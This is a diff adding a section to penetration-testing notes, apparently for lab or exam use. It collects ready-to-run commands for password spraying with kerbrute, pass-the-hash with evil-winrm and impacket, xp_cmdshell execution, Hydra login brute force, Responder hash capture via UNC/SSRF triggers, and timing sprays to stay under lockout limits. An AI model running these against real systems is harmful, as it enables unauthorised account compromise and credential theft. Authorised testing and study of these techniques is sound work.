@@ -250,6 +250,157 @@ nxc smb 192.168.1.10 -u admin -p 'Password1' --local-auth
 
 ---
 
+---
+
+## When the Spray Finds Nothing — Manual Auth Testing
+
+> [!important] sprayr.sh covers SMB, WinRM, and SSH. These are the protocols and techniques it doesn't automate. Use these when you have valid credentials but can't get a shell, or when you need to test services the script doesn't reach.
+
+---
+
+### Valid Creds but No Pwn3d! — Try Every Service
+
+When spray returns valid auth but no admin, the creds may only work on a specific service:
+
+```bash
+# RDP — doesn't need admin on most configurations
+xfreerdp /u:user /p:'pass' /d:domain /v:IP /cert-ignore +clipboard
+# If MFA or NLA error: try /sec:rdp or /sec:nla flags
+
+# MSSQL — if port 1433 open
+nxc mssql IP -u user -p pass
+impacket-mssqlclient domain/user:pass@IP -windows-auth
+# Once in: EXEC xp_cmdshell 'whoami'   (may need to enable it first)
+# EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+# EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+
+# FTP — if port 21 open
+ftp IP   # enter credentials at prompt
+
+# MySQL — if port 3306 open
+mysql -h IP -u user -p
+
+# Web application logins — try the creds on every login page found
+# Don't forget /admin, /login, /wp-login.php, /phpmyadmin, /manager/html (Tomcat)
+
+# POP3/IMAP — if ports 110/143/993/995 open
+nc -nv IP 110
+USER user
+PASS pass
+LIST           # list emails — may contain credentials or hints
+
+# SSH with certs (when password auth is disabled)
+ssh -i /path/to/key user@IP
+# If you have the private key from lootr output, try it directly
+```
+
+---
+
+### Kerberos Pre-Authentication Spray (Domain Only)
+
+When you don't know valid usernames yet or want to avoid LDAP-based lockouts:
+
+```bash
+# kerbrute is faster and stealthier than LDAP-based spraying
+# Enumerate valid users first (no password attempt = no lockout)
+kerbrute userenum --dc DC_IP -d corp.local userlist.txt
+
+# Then spray ONE password (check lockout policy first)
+kerbrute passwordspray --dc DC_IP -d corp.local valid_users.txt 'Summer2024!'
+
+# Common passwords to try (one at a time, respecting lockout window)
+# Password1, Welcome1, Password123!, <company>123, <month><year>
+# <season><year>, <company>@2024, <username>123
+```
+
+---
+
+### When You Have an NTLM Hash But SMB is Blocked
+
+```bash
+# WinRM (port 5985)
+evil-winrm -i IP -u user -H NTHASH
+
+# MSSQL with hash
+impacket-mssqlclient domain/user@IP -hashes :NTHASH -windows-auth
+
+# RDP with hash (Restricted Admin mode must be enabled)
+xfreerdp /u:user /pth:NTHASH /v:IP /d:domain /cert-ignore
+
+# WMI (no service install needed, lower footprint than psexec)
+impacket-wmiexec domain/user@IP -hashes :NTHASH
+
+# DCOM
+impacket-dcomexec domain/user@IP -hashes :NTHASH
+```
+
+---
+
+### Web Application Login Brute Force
+
+For login forms not covered by sprayr.sh:
+
+```bash
+# Identify the POST data structure first
+curl -ski http://IP/login -X POST -d "user=test&pass=test" -v 2>&1 | head -30
+
+# Hydra HTTP POST form
+# Format: "/path:POST_body:failure_string"
+hydra -l admin -P /usr/share/wordlists/rockyou.txt IP http-post-form \
+  "/login:username=^USER^&password=^PASS^:Invalid"
+
+# With a userlist
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt IP http-post-form \
+  "/login:user=^USER^&pass=^PASS^:incorrect"
+
+# HTTPS
+hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 443 -S IP https-post-form \
+  "/login:user=^USER^&pass=^PASS^:failed"
+
+# Tomcat manager (common target)
+hydra -L /usr/share/seclists/Usernames/tomcat-usernames.txt \
+  -P /usr/share/seclists/Passwords/tomcat-passwords.txt \
+  IP http-get /manager/html
+```
+
+---
+
+### Capturing Hashes With Responder (When You Can't Spray)
+
+When you have no working creds but you're on the same network segment:
+
+```bash
+# Start Responder to poison LLMNR/NBT-NS/MDNS and capture Net-NTLMv2 hashes
+sudo responder -I tun0 -wdPv
+
+# Trigger authentication from a target (from any machine you control):
+# Try accessing non-existent UNC path from target
+# If you have RCE: \\KALI_IP\share   (triggers auth to your Responder)
+# If web app has SSRF: http://KALI_IP/
+
+# Cracked hash → immediately spray: ./crackr.sh -q -f ntlmv2.txt → ./sprayr.sh --from-creds
+```
+
+---
+
+### Password Policy Enforcement — When You're Afraid to Lock Accounts
+
+```bash
+# Get lockout policy before ANY domain spraying
+nxc smb DC_IP -u user -p pass --pass-pol
+# Look for: Account Lockout Threshold and Observation Window
+
+# If threshold = 3 and window = 30min:
+# → Spray 1 password, wait 31 minutes, spray another
+# → Use kerbrute for the spray (Kerberos errors are less likely to increment lockout counter on old DCs)
+
+# Fine-grained password policies may protect privileged accounts differently
+# Check PSO (Password Settings Object) in BloodHound or:
+Get-ADFineGrainedPasswordPolicy -Filter * | Select-Object Name, LockoutThreshold, LockoutObservationWindow
+```
+
+---
+
 ## Related
 
 - [[adr]] — run first to get users/all_users.txt and check lockout policy
